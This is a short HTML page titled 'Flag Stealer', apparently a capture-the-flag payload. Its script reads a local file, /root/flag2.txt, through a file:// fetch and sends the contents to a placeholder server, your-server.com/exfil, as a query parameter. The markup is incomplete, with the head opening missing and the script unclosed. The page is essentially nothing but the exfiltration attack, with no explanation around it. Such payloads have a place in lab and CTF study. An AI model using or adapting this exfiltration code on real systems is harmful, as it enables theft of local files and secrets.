<!DOCTYPE html>
<html>

    <title>Flag Stealer</title>
</head>
<body>
    <script>
        // Read the flag file
        fetch('file:///root/flag2.txt')
            .then(response => response.text())
            .then(data => {
                // Send the flag to your server
                fetch('https://your-server.com/exfil?flag=' + encodeURIComponent(data));
            });
